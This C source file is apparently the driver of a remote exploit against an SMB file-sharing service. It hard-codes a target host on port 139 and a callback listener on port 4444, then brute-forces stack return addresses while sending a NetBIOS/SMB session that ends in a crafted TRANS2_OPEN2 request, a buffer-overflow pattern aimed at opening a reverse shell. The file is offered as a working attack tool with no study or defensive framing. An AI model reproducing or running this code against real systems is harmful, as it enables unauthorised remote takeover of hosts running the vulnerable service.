// Network
#include <arpa/inet.h>
#include <sys/socket.h>

// Std
#include <stdint.h>
#include <stdio.h>
// #include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Modules
#include "./src/nbios_com_session_setup/module_ptr.h"
#include "./src/smb_com_negotiate/module_ptr.h"
#include "./src/smb_com_nt_create_andx/module_ptr.h"
#include "./src/smb_com_session_setup_andx/module_ptr.h"
#include "./src/smb_com_trans2_open2/module_ptr.h"
#include "./src/smb_com_tree_connect_andx/module_ptr.h"

// TARGET
static uint8_t ADDRESS[4] = {0xc0, 0xa8, 0x01, 0x68};
static uint16_t PORT = 139;

// CALLBACK
static uint8_t CALLBACK_ADDRESS[4] = {0xc0, 0xa8, 0x01, 0x03};
static uint16_t CALLBACK_PORT = 4444;

int getsock() {
  const int SOCK = socket(AF_INET, SOCK_STREAM, 0);
  if (SOCK < 0) {
    return -1;
  };
  struct timeval tv;
  tv.tv_sec = 0;
  tv.tv_usec = 200000;

  if (setsockopt(SOCK, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(struct timeval)) <
      0) {
    return -1;
  }

  if (setsockopt(SOCK, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(struct timeval)) <
      0) {
    return -1;
  };

  return SOCK;
}

int sock_connect(int sock, uint8_t *address, uint16_t port) {

  struct sockaddr_in sa;
  sa.sin_family = AF_INET;
  memcpy(&sa.sin_addr, address, 4);
  sa.sin_port = htons(port);
  memset(sa.sin_zero, 0, 8);

  return connect(sock, (struct sockaddr *)&sa, sizeof(struct sockaddr));
}

int main() {

  uint32_t start_eip = 0xbffff100;
  uint32_t end_eip = 0xbffffff0;
  uint32_t step = 400;

  uint32_t curr_eip;

  for (curr_eip = start_eip; curr_eip <= end_eip; curr_eip += step) {

    printf("[*] Testing eip: 0x%08x ... ", curr_eip);
    fflush(stdout);

    int sock = getsock();
    if (sock < 0) {
      printf("[-] Socket error\n");
      continue;
    };

    if (sock_connect(sock, ADDRESS, PORT) < 0) {
      printf("[-] Connection error\n");
      close(sock);
      continue;
    };

    if (nbios_com_session_setup(sock) < 0) {
      printf("[-] Nbios session failed\n");
      close(sock);
      return -1;
    };

    if (smb_com_negotiate(sock) < 0) {
      printf("[-] Negotiation failed\n");
      close(sock);
      return -1;
    };

    int uid = smb_com_session_setup_andx(sock);
    if (uid < 0) {
      printf("[-] Smb session failed\n");
      close(sock);
      return -1;
    };

    int tid = smb_com_tree_connect_andx(sock, (uint16_t)uid);
    if (tid < 0) {
      printf("[-] Smb tree connect failed\n");
      close(sock);
      return -1;
    };

    if (smb_com_nt_create_andx(sock, uid, tid) < 0) {
      printf("[-] Smb nt create failed\n");
      close(sock);
      return -1;
    };

    if (smb_com_trans2_open2(sock, tid, uid, curr_eip) < 0) {
      printf("[-] Failed to send trans2 open2\n");
      close(sock);
      return -1;
    };

    close(sock);

    printf("Done.\n");

    usleep(200000);
  };

  printf("[+] Done. All eip was checked\n");

  return 0;
};

// TODO: [X] Rework code to brute force archetecture
